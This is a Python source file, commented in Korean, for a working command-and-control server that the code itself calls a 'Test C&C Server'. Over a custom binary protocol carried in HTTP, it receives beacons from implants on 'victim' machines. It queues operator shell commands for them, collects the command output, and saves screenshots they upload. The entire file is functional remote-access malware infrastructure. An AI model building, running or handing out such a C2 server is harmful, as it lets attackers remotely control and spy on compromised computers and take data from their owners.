#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from struct import unpack
from collections import deque
from datetime import datetime

import threading



# 커스텀 프로토콜의 타입을 정의해둔 클래스
class TypeTable:
    TYPE_LIST = {
        'ACK' : b'\x00',    
        'ERROR' :  b'\x01',
        'BEACON_REQUEST' : b'\x02',     
        'SHELL_REQUEST' : b'\x03',     
        'SHELL_RESPONSE' : b'\x04',    
        'FTP_REQUEST' : b'\x05',        
        'FTP_RESPONSE' : b'\x06',
    }


class CustomProtocol(TypeTable):
    Header = b'\xDD'
    type = b''
    length = b''
    sequence = b''
    data = b""

    # 헤더 값 구성
    def __init__(self, type : str, seq : int, data : bytes) -> None:
        self.type = self.TYPE_LIST[type]
        self.length = len(data).to_bytes(4, byteorder="little")
        self.sequence = seq.to_bytes(4, byteorder="little")
        self.data = data

    # 헤더 값들을 byte 타입으로 리턴
    def __bytes__(self) -> bytes:
        return self.Header + self.type + self.length + self.sequence + self.data


class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
    
    # 모듈에서 제공하는 로그 시스템 off
    def log_message(self, format, *args):
        return

    # log 출력
    def print_log(self, message, warning=False):
        if LOG_PRINT == False:
            return
        log_type = "[*]" if not warning else "[!]"

        print("{0} {1}".format(log_type, message))

    # hex 값에 따른 type string을 리턴
    def _get_type(self, type_num):
        for k, v in self.TYPE_LIST.items():
            if v == type_num.to_bytes(1, byteorder="little"):
                return k

    def _raw_data_parsing(self, raw_data):
        result = {}
        result['header'] = hex(raw_data[0])
        result['type'] = self._get_type(raw_data[1])
        result['length'] = unpack('<L', raw_data[2:6])[0]
        result['sequence'] = unpack('<L', raw_data[6:10])[0]
        result['data'] = raw_data[10:11+result['length']]
        
        return result
    
    # parsing된 데이터 출력 메서드
    def _print_parsed_data(self, parsed_data):
        self.print_log('==parsed data==')
        try:
            for header, value in parsed_data.items():
                if header == 'data':
                    value = value.decode(ENCODING)
                self.print_log('{0} : {1}'.format(header, value))
        except UnicodeDecodeError as e:
            self.print_log('[!] not utf-8 data', True)

    # 기본 헤더 정의
    def _set_header(self, header={}):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset={}'.format(ENCODING))

        if len(header) > 0:
            for k, v in header.items():
                self.send_header(k, v)

        self.end_headers()

    # 큐에 들어있는 값 pop
    def _pop_queue(self, ip):
        global COMMAND_QUEUE

        command = b""

        if ip not in COMMAND_QUEUE or len(COMMAND_QUEUE[ip]) < 1:
            return False

        queue = COMMAND_QUEUE[ip]

        element = queue.popleft()
        
        if not element.startswith(b'sh '):
            return element

        while True:
            if not element.startswith(b'sh '):
                queue.appendleft(element)
                break

            command += element.split(b' ', maxsplit=1)[1] + b";"
            if not queue:
                break
            element = queue.popleft()

        return command[:-1]

    # command response
    def _command_execute_response(self, command : bytes):
        self._set_header()
        protocol_data = bytes(CustomProtocol('SHELL_REQUEST', 0, command))
        self.wfile.write(protocol_data)

    # ack response
    def _becon_ack_response(self):
        self._set_header()
        protocol_data = bytes(CustomProtocol('ACK', 0, ''.encode(ENCODING)))
        print(protocol_data)
        self.wfile.write(protocol_data)

    def _ftp_request(self, data):
        self._set_header()
        protocol_data = bytes(CustomProtocol('FTP_REQUEST', 0, data))
        self.wfile.write(protocol_data)
    
    # victim 딕셔너리에 ip 추가
    def _add_victim_ip(self, ip):
        global VICTIM_LIST
        global COMMAND_QUEUE
        global SEQUENCE_DATA
        global FILE_NAME_LIST
        if ip not in VICTIM_LIST:
            VICTIM_LIST[ip] = ip
            COMMAND_QUEUE[ip] = deque()
            SEQUENCE_DATA[ip] = [1, b""]
            FILE_NAME_LIST[ip] = deque()

    def _check_sequence(self, seq, data, client_ip):
        global SEQUENCE_DATA

        next_sequence_num = SEQUENCE_DATA[client_ip][0]

        if seq == 0 and next_sequence_num == 1:
            return data

        elif seq == next_sequence_num:
            SEQUENCE_DATA[client_ip][1] += data
            SEQUENCE_DATA[client_ip][0] += 1

        # elif seq != 0:
        #     raise Exception("Invalid Sequence / {0}".format(seq))
        elif seq == 0 and next_sequence_num != 1:
            # print('==splited data==\n{}\n'.format(SEQUENCE_DATA[client_ip][1]))
            result = SEQUENCE_DATA[client_ip][1] + data
            SEQUENCE_DATA[client_ip][1] = b""
            SEQUENCE_DATA[client_ip][0] = 1
            return result
    
    def save_file(self, file_name, data):
        try:
            with open(file_name, 'wb') as f:
                f.write(data)
        except Exception as e:
            self.print_log('[!] file save error\nMessage : {}'.format(str(e)), True)
            return False
        
        self.print_log('[*] {} save success'.format(file_name))
        return True

    # POST 요청이 들어올 시 처리해주는 코드
    def do_POST(self):
        global FILE_NAME_LIST

        data_string = self.rfile.read(int(self.headers['Content-Length'])) # post body data를 읽어서 data_string에 저장
        client_ip = self.client_address[0]                                 # 접속 ip get

        # try except 문으로 에러 핸들링
        try:
            # 최소 길이 만족 못하면 에러 발생
            if len(data_string) < 8:
                raise Exception("Protocol Header Error")

            # body data를 커스텀 프로토콜에 맞춰 파싱 후 출력
            parsed_data = self._raw_data_parsing(data_string)
            self._print_parsed_data(parsed_data)

            # magic 값 검증
            if parsed_data['header'] != '0xdd':
                raise Exception("Magic Header Error / {} != 0xdd".format(parsed_data['header']))

            # ip를 딕셔너리들에 추가
            self._add_victim_ip(client_ip)

            # sequence 처리
            parsed_data['data'] = self._check_sequence(parsed_data['sequence'], parsed_data['data'], client_ip)
            
        except Exception as e:
            # 오류 발생시 오류 문구를 리턴
            self._set_header()
            self.wfile.write('[!] Invalid Header\nError Message : {}'.format(str(e)).encode('utf-8'))
            self.print_log()
            print_victims()
            print('> ', end='')
            return

        # type 별 처리
        if parsed_data['type'] == 'BEACON_REQUEST': # BEACON_REQUEST
            command = self._pop_queue(client_ip)

            if command:
                if command == b'screenshot':
                    FILE_NAME_LIST[client_ip].append(datetime.now().strftime('%Y%m%d-%H%M%S') + '.bmp')
                    self._ftp_request(command)
                else:
                    self._command_execute_response(command)
                    self.print_log('[*] send command\n[*] target : {0}\n[*] command : {1}'.format(client_ip, command))
            else:
                self._becon_ack_response()
        elif parsed_data['type'] == 'SHELL_RESPONSE': # SHELL_RESPONSE
            self.print_log('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
            # print('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
            self._becon_ack_response()
        elif parsed_data['type'] == 'FTP_RESPONSE':
            if len(FILE_NAME_LIST[client_ip]) > 0 and parsed_data['sequence'] == 0:
                file_name = FILE_NAME_LIST[client_ip].popleft()
                self.save_file(file_name, parsed_data['data'])
                self._becon_ack_response()
            else:
                # self.print_log('[!] file queue error\nThere is no data in file name queue', True)
                self._becon_ack_response()
        else:
            self._becon_ack_response()

        # 예쁘게 출력하기 위한 코드
        if LOG_PRINT:
            print()
            print_victims()
            print('> ', end='')

# True : 로그 출력
# False : 로그 출력 x
LOG_PRINT = True

# 서버 주소와 포트
# 자신의 ip, port로 설정
SERVER_INFO = ('172.17.246.74', 80)

# encoding
ENCODING = 'cp949'

# save path for ftp response
FILE_SAVE_PATH = './'

# 피해자 ip 및 여러 정보들을 담을 딕셔너리
VICTIM_LIST = {} # hostname : ip 
COMMAND_QUEUE = {} # ip : command queue
SEQUENCE_DATA = {} # ip : [next sequence num, data]
FILE_NAME_LIST = {} # ip : [fileName queue]

SUPPORTED_COMMAND = ['screenshot', 'sh']

menu_message = '''==Test C&C Server==
Enter the command sending to the victim
ex) [victim name]|sh [shell command]
ex2) [victim name]|screenshot
'''

print(menu_message)

# hostname와 매칭하여 사용자가 입력한 command를 큐에 저장
def add_command(victim_name, command):
    COMMAND_QUEUE[VICTIM_LIST[victim_name]].append(bytes(command, ENCODING))

# victim 목록 출력
def print_victims():
    if len(VICTIM_LIST) < 0:
        return
    print('=Victim List=')
    for ip, name in VICTIM_LIST.items():
        print('{} | {} | {}'.format(ip, name, list(COMMAND_QUEUE[ip])))

# HTTP Server를 open하는 코드
try:
    httpd = HTTPServer(SERVER_INFO, HTTPHandler)

    http_server_thread = threading.Thread(target=httpd.serve_forever)
    http_server_thread.daemon = True
    http_server_thread.start()  
except Exception as e:
    print('[!] HTTP Server Open Error / {}'.format(str(e)))
    exit(0)

# <hostname>|<command> 방식으로 입력된 데이터를 파싱하여 큐에 저장
# shell request를 보낼 경우 <hostname> | sh <shell command>
while True:
    print_victims()
    try:
        inputVal = input('> ')
        if inputVal == 'exit':
            break

        victim, command = inputVal.split('|')
    except KeyboardInterrupt:
        break
    except Exception:
        print('[!] invalid command\n')
        continue

    if victim in VICTIM_LIST and command.split()[0] in SUPPORTED_COMMAND:
        add_command(victim, command)
    else:
        print('[!] victims or command not found\n')
print()
exit(0)